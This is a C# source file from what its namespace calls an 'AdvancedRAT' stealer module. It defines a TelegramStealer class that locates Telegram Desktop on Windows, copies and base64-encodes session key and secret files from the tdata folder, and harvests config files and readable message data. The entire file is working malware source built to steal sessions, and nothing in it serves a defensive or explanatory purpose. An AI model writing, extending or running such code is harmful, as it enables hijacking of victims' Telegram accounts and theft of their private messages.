using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using System.Text.RegularExpressions;

namespace AdvancedRAT.Stealers.MessengerStealer
{
    public class TelegramStealer
    {
        public static async Task<Dictionary<string, string>> StealTelegramSessions()
        {
            return await Task.Run(() =>
            {
                Dictionary<string, string> telegramSessions = new Dictionary<string, string>();
                
                try
                {
                    string telegramPath = FindTelegramInstallation();
                    if (string.IsNullOrEmpty(telegramPath) || !Directory.Exists(telegramPath))
                    {
                        Console.WriteLine("Telegram installation not found");
                        return telegramSessions;
                    }
                    
                    // Look for tdata directory which contains session data
                    string tdataPath = Path.Combine(telegramPath, "tdata");
                    if (Directory.Exists(tdataPath))
                    {
                        // Enumerate all files in tdata directory
                        string[] files = Directory.GetFiles(tdataPath, "*", SearchOption.AllDirectories);
                        
                        foreach (string file in files)
                        {
                            string relativePath = Path.GetRelativePath(tdataPath, file);
                            if (ShouldIncludeFile(relativePath))
                            {
                                try
                                {
                                    byte[] fileContent = File.ReadAllBytes(file);
                                    telegramSessions[relativePath] = Convert.ToBase64String(fileContent);
                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine($"Error reading Telegram file {relativePath}: {ex.Message}");
                                }
                            }
                        }
                    }
                    
                    // Also look for config files
                    string[] configFiles = Directory.GetFiles(telegramPath, "*.ini", SearchOption.TopDirectoryOnly);
                    foreach (string configFile in configFiles)
                    {
                        string fileName = Path.GetFileName(configFile);
                        telegramSessions[fileName] = File.ReadAllText(configFile);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error stealing Telegram sessions: {ex.Message}");
                }
                
                return telegramSessions;
            });
        }
        
        public static async Task<List<string>> StealTelegramSavedMessages()
        {
            return await Task.Run(() =>
            {
                List<string> savedMessages = new List<string>();
                
                try
                {
                    string telegramPath = FindTelegramInstallation();
                    if (string.IsNullOrEmpty(telegramPath) || !Directory.Exists(telegramPath))
                    {
                        Console.WriteLine("Telegram installation not found");
                        return savedMessages;
                    }
                    
                    // Look for database files that might contain messages
                    string tdataPath = Path.Combine(telegramPath, "tdata");
                    if (Directory.Exists(tdataPath))
                    {
                        // In tdata, Telegram stores messages in encrypted format
                        // We'll look for any text-like content in accessible files
                        string[] files = Directory.GetFiles(tdataPath, "*", SearchOption.AllDirectories);
                        
                        foreach (string file in files)
                        {
                            string fileName = Path.GetFileName(file);
                            if (fileName.EndsWith(".dat") || fileName.EndsWith(".json") || fileName.EndsWith(".txt"))
                            {
                                try
                                {
                                    string content = File.ReadAllText(file);
                                    if (!string.IsNullOrEmpty(content) && content.Length > 10)
                                    {
                                        savedMessages.Add(content);
                                    }
                                }
                                catch (Exception ex)
                                {
                                    // Some files might be encrypted or in binary format
                                    // Just skip them
                                }
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error stealing Telegram saved messages: {ex.Message}");
                }
                
                return savedMessages;
            });
        }
        
        public static async Task<string> GetTelegramConfig()
        {
            return await Task.Run(() =>
            {
                try
                {
                    string telegramPath = FindTelegramInstallation();
                    if (string.IsNullOrEmpty(telegramPath) || !Directory.Exists(telegramPath))
                    {
                        Console.WriteLine("Telegram installation not found");
                        return "";
                    }
                    
                    // Look for config files
                    string[] configPatterns = { "config", "settings", "*.ini", "webview_storage/*" };
                    
                    foreach (string pattern in configPatterns)
                    {
                        string[] configFiles = Directory.GetFiles(telegramPath, pattern, SearchOption.AllDirectories);
                        foreach (string configFile in configFiles)
                        {
                            try
                            {
                                return File.ReadAllText(configFile);
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine($"Could not read config file {configFile}: {ex.Message}");
                            }
                        }
                    }
                    
                    return "";
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error getting Telegram config: {ex.Message}");
                    return "";
                }
            });
        }
        
        private static string FindTelegramInstallation()
        {
            try
            {
                // Common Telegram installation paths
                string[] possiblePaths = {
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Telegram Desktop"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"TelegramDesktop"),
                    @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Telegram Desktop",
                    @"C:\Users\" + Environment.UserName + @"\AppData\Local\TelegramDesktop"
                };
                
                foreach (string path in possiblePaths)
                {
                    if (Directory.Exists(path))
                    {
                        // Verify it's actually Telegram by checking for necessary files
                        if (Directory.Exists(Path.Combine(path, "tdata")) || 
                            File.Exists(Path.Combine(path, "Telegram.exe")))
                        {
                            return path;
                        }
                    }
                }
                
                return "";
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error finding Telegram installation: {ex.Message}");
                return "";
            }
        }
        
        private static bool ShouldIncludeFile(string filePath)
        {
            // Skip large files and system files that are not useful
            string fileName = Path.GetFileName(filePath).ToLower();
            
            // Skip these file types as they're likely not useful or too large
            string[] skipExtensions = { ".tmp", ".log", ".db-shm", ".db-wal", "dumps" };
            foreach (string ext in skipExtensions)
            {
                if (fileName.EndsWith(ext))
                    return false;
            }
            
            // Skip files that are likely cache or temporary
            if (fileName.Contains("cache") || fileName.Contains("temp") || fileName.Contains("tmp"))
                return false;
                
            // Include important session files
            if (fileName.Contains("key") || fileName.Contains("session") || fileName.Contains("map") || fileName.Contains("secret"))
                return true;
                
            // Include general data files
            return true;
        }
        
        public static async Task<bool> IsTelegramInstalled()
        {
            string telegramPath = FindTelegramInstallation();
            return !string.IsNullOrEmpty(telegramPath) && Directory.Exists(telegramPath);
        }
    }
}